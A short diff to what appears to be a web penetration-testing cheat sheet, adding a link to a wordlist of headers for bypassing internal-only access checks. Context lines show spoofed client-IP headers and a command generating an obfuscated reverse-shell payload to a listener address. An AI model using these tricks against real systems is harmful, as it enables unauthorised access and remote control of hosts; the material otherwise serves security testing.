@@ -118,6 +118,8 @@ X-Remote-IP: 127.0.0.1
 X-Remote-Addr: 127.0.0.1
 X-Client-IP: 127.0.0.1
 ```
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/headers_internal_bypass.txt
+
 ### Reverse Shell Obfuscator
 e.g.  
 `python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type hex`  
